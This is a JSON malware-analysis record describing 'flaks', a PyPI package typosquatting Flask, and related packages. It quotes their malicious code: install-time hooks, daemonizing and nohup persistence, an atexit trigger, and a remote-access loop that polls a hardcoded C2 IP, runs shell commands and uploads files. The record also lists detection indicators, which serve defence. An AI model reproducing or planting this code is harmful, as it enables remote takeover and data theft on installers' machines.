@@ -1,0 +1,219 @@
+{
+  "package_info": {
+    "package_name": "flaks",
+    "package_manager": "PyPI",
+    "package_versions": "1.2 (and earlier versions 0.1-1.1); also affects flaks_setup 1.2 and earlier",
+    "why_malicious": "The package is a typosquat of the popular Flask package and is designed to install a secondary malicious package (flaks_setup) as a dependency. Upon installation, it executes code that establishes a persistent backdoor (RAT) on the victim's machine, enabling remote command execution, file exfiltration, and process persistence. The attack chain is triggered automatically during installation, requiring no user interaction beyond the initial pip install."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "flaks/setup.py",
+        "required_permissions": [
+          "filesystem",
+          "import",
+          "network"
+        ]
+      },
+      "code_snippet": "class PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        import flaks_setup\n        flaks_setup.post_install()",
+      "code_language": "python",
+      "code_behavior": "During installation, the code imports the flaks_setup package and executes its post_install() function, which initiates the RAT backdoor setup.",
+      "malice_analysis": {
+        "why_suspicious": "Executing arbitrary code during package installation is a common malware technique, especially when it imports and runs code from a secondary package.",
+        "violated_expectations": "Normal setup.py files should not execute post-install code that establishes persistent processes or backdoors.",
+        "similar_legitimate_use": "Some legitimate packages use postinstall hooks for compiling binaries or setting up environment-specific configurations, but not for persistent background processes.",
+        "key_indicators": [
+          "Custom install command triggers code execution",
+          "Imports and executes code from a dependency immediately after install"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "postinstall (via flaks PostInstallCommand)",
+        "file_location": "flaks_setup/__init__.py",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "process"
+        ]
+      },
+      "code_snippet": "def post_install():\n    pid = os.fork()\n    if pid == 0:  # This is the child process\n        os.setsid()  # Create a new session for the child process\n        execute()\n        sys.exit(0)",
+      "code_language": "python",
+      "code_behavior": "During installation, the code forks the current process, daemonizes it, and calls the execute() function to establish a persistent background RAT process.",
+      "malice_analysis": {
+        "why_suspicious": "Forking and daemonizing a process during installation is highly unusual and is a known persistence technique for malware.",
+        "violated_expectations": "Legitimate packages should not create persistent background processes as part of their installation.",
+        "similar_legitimate_use": "Rarely, some system-level packages may use daemonization for legitimate background services, but not in general-purpose Python libraries.",
+        "key_indicators": [
+          "os.fork() and os.setsid() used for daemonization",
+          "Background process persists after installation"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "postinstall (child process, persistent background execution)",
+        "file_location": "flaks_setup/__init__.py (execute function)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "process"
+        ]
+      },
+      "code_snippet": "def execute():\n    HOST = \"http://46.101.114.247:80\"\n    current_dir = os.getcwd()\n    while True:\n        req = requests.get(f'{HOST}')\n        command = req.text\n        if 'exit' in command:\n            break\n        elif 'grab' in command:\n            grab, path, filename = command.split(\" \")\n            print(grab, path, filename)\n            if os.path.exists(path):\n                url = f\"{HOST}/store\"\n                files = {'file': (filename, open(path, 'rb'))}\n                r = requests.post(url, files=files)\n            else:\n                post_response = requests.post(\n                    url=f'{HOST}', data='[-] Not able to find the file!'.encode())\n        elif 'cd' in command:\n            code, path = command.split(' ')\n            try:\n                os.chdir(path)\n                current_dir = os.getcwd()\n                post_response = requests.post(\n                    url=f'{HOST}', data=current_dir.encode())\n            except FileNotFoundError as e:\n                post_response = requests.post(\n                    url=f'{HOST}', data=str(e).encode())\n        else:\n            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,\n                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)\n            post_response = requests.post(\n                url=f'{HOST}', data=CMD.stdout.read())\n            post_response = requests.post(\n                url=f'{HOST}', data=CMD.stderr.read())",
+      "code_language": "python",
+      "code_behavior": "At runtime (background process), the code polls a remote C2 server for commands, executes arbitrary shell commands, exfiltrates files, changes directories, and sends command output and errors back to the attacker.",
+      "malice_analysis": {
+        "why_suspicious": "Persistent polling of a remote server for commands, arbitrary command execution, and file exfiltration are classic RAT behaviors.",
+        "violated_expectations": "Normal packages do not establish C2 communication or allow remote code execution.",
+        "similar_legitimate_use": "Remote management agents may use similar patterns, but not in general-purpose Python packages.",
+        "key_indicators": [
+          "Hardcoded C2 server IP (46.101.114.247)",
+          "Arbitrary command execution and file exfiltration",
+          "Persistent while True loop for polling"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "postinstall (flaaks2 0.2, via setup.py cmdclass)",
+        "file_location": "flaaks2/background_task.py",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "process",
+          "import"
+        ]
+      },
+      "code_snippet": "def configure_package():\n    ...\n    def main():\n        terminal_process = create_hidden_terminal()\n        while True:\n            try:\n                response = requests.get(SERVER_URL)\n                command = response.text.strip()\n                command_thread = threading.Thread(\n                    target=process_command, args=(terminal_process, command))\n                command_thread.start()\n                command_thread.join()\n            except (requests.exceptions.RequestException, requests.exceptions.Timeout):\n                print(\"Connection error, retrying in 30 seconds\")\n                time.sleep(SLEEP_TIME)\n            except ConnectionResetError:\n                print(\"Connection dropped, retrying in 30 seconds\")\n                time.sleep(SLEEP_TIME)\n            except Exception as e:\n                print(f\"Unknown error: {e}\")\n                time.sleep(SLEEP_TIME)\n            time.sleep(SLEEP_TIME)\n    if __name__ == \"__main__\":\n        configure_package()",
+      "code_language": "python",
+      "code_behavior": "At runtime (postinstall or import-time), the code establishes a hidden terminal, polls a remote server for commands, executes them, and exfiltrates results, acting as a basic RAT.",
+      "malice_analysis": {
+        "why_suspicious": "Hidden terminal creation, persistent polling, and remote command execution are all hallmarks of RATs.",
+        "violated_expectations": "Normal packages do not create hidden terminals or allow remote control.",
+        "similar_legitimate_use": "Penetration testing tools may use similar code, but not in production packages.",
+        "key_indicators": [
+          "subprocess.Popen([\"bash\"]) for hidden terminal",
+          "Polling external server for commands",
+          "Threaded command execution"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "postinstall (flaaks2 0.2, via setup.py cmdclass)",
+        "file_location": "flaaks2/post_install.py",
+        "required_permissions": [
+          "filesystem",
+          "process"
+        ]
+      },
+      "code_snippet": "def run():\n    print(\"hi\")\n    script_path = os.path.abspath(sys.argv[0])\n    cmd = f\"nohup python {script_path} > /dev/null 2>&1 &\"\n    subprocess.Popen(cmd, shell=True)",
+      "code_language": "python",
+      "code_behavior": "At postinstall, the code launches a background process using nohup to persist the malicious script, redirecting output to /dev/null for stealth.",
+      "malice_analysis": {
+        "why_suspicious": "Launching a background process with nohup and suppressing output is a known persistence and stealth technique.",
+        "violated_expectations": "Legitimate packages should not persist their own processes after installation.",
+        "similar_legitimate_use": "Some daemons or services may use nohup, but not in general-purpose libraries.",
+        "key_indicators": [
+          "nohup used for persistence",
+          "Output redirected to /dev/null"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_6",
+      "execution_context": {
+        "trigger": "import-time (flaaks2 0.3, via __init__.py)",
+        "file_location": "flaaks2/__init__.py",
+        "required_permissions": [
+          "import",
+          "filesystem",
+          "network",
+          "process"
+        ]
+      },
+      "code_snippet": "import atexit\n\ndef _post_install():\n    print(\"Running background_task...\")\n    from .background_task import configure_package\n    configure_package()\n    print(\"Running post_install...\")\n    from .post_install import run\n    run()\n\natexit.register(_post_install)",
+      "code_language": "python",
+      "code_behavior": "At import-time, registers a function with atexit to execute background_task and post_install logic when the interpreter exits, ensuring malicious code runs even if not triggered at install.",
+      "malice_analysis": {
+        "why_suspicious": "Using atexit to trigger malicious code on interpreter exit is an unusual and stealthy persistence technique.",
+        "violated_expectations": "Normal packages do not register atexit hooks to run background RATs.",
+        "similar_legitimate_use": "Rarely used for cleanup in legitimate code, but not for launching RATs.",
+        "key_indicators": [
+          "atexit.register used for persistence",
+          "Chained execution of background_task and post_install"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "User installs the flaks package (typosquat of Flask), which declares flaks_setup as a dependency.",
+      "implemented_by": [],
+      "leads_to": "Installation of flaks_setup package"
+    },
+    {
+      "step": 2,
+      "action": "During flaks installation, the custom PostInstallCommand executes, importing flaks_setup and calling its post_install() function.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Execution of flaks_setup post_install()"
+    },
+    {
+      "step": 3,
+      "action": "flaks_setup's post_install() forks and daemonizes a background process, calling the execute() function.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Persistent background RAT process"
+    },
+    {
+      "step": 4,
+      "action": "The execute() function in flaks_setup establishes a C2 channel, polls for commands, executes them, and exfiltrates data.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Attacker gains remote access and control"
+    },
+    {
+      "step": 5,
+      "action": "Alternative attack chains in flaaks2 use setup.py cmdclass or atexit in __init__.py to trigger similar RAT and persistence logic.",
+      "implemented_by": [
+        "snippet_4",
+        "snippet_5",
+        "snippet_6"
+      ],
+      "leads_to": "Background RAT process and persistence via multiple vectors"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Custom install commands in setup.py that import and execute code from dependencies",
+      "Daemonization or background process creation during installation (os.fork, os.setsid, nohup)",
+      "Persistent polling of external C2 servers for commands",
+      "Arbitrary shell command execution and file exfiltration via HTTP",
+      "Use of atexit to register post-exit malicious code"
+    ],
+    "file_indicators": [
+      "setup.py with custom cmdclass or PostInstallCommand",
+      "__init__.py with post_install or atexit hooks",
+      "background_task.py or post_install.py files with suspicious subprocess or network code"
+    ],
+    "network_indicators": [
+      "HTTP requests to hardcoded IPs (e.g., 46.101.114.247, 139.177.181.203)",
+      "Outbound connections to uncommon ports (e.g., :80) immediately after install",
+      "Repeated polling to remote servers for command-and-control"
+    ],
+    "how_to_detect": "Monitor for Python package installations that trigger custom install commands or background processes. Flag packages that fork or daemonize processes, use nohup, or register atexit hooks for post-exit execution. Detect outbound HTTP requests to hardcoded IPs or domains immediately after installation, especially if accompanied by file uploads or command execution. Review package metadata for typosquatting patterns and dependencies that are not widely used. Use static analysis to identify suspicious subprocess, os.fork, or network code in setup.py, __init__.py, or auxiliary scripts."
+  }
+}
